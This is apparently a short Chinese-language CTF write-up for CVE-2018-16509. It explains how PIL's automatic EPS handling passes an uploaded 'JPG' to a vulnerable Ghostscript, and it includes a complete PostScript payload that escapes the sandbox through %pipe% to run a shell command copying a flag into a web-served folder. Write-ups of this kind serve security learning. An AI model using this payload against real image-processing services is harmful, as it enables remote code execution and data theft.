## 分析

这道题考点是 `CVE-2018-16509`

`GhostScript 2.23` 的安全沙箱可以被绕过，恶意的 `JPG` 文件可以导致 `RCE`，还需要添加一些边界内容 `%%BoundingBox: -0 -0 100 100` ，防止`IO`错误

```
Content of uploaded file will be loaded by img = Image.open(img_path). PIL will automatically detect if the image is an EPS image (example: add %!PS-Adobe-3.0 EPSF-3.0 at the beginning of file) and will call _open() in EpsImageFile class in EPSImagePlugin.py. To avoid raise IOError("cannot determine EPS bounding box"), a bounding box need to be added in the file (example: %%BoundingBox: -0 -0 100 100).
```


`Payload` 如下：
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

参考链接
[https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-16509](https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-16509)


[https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509)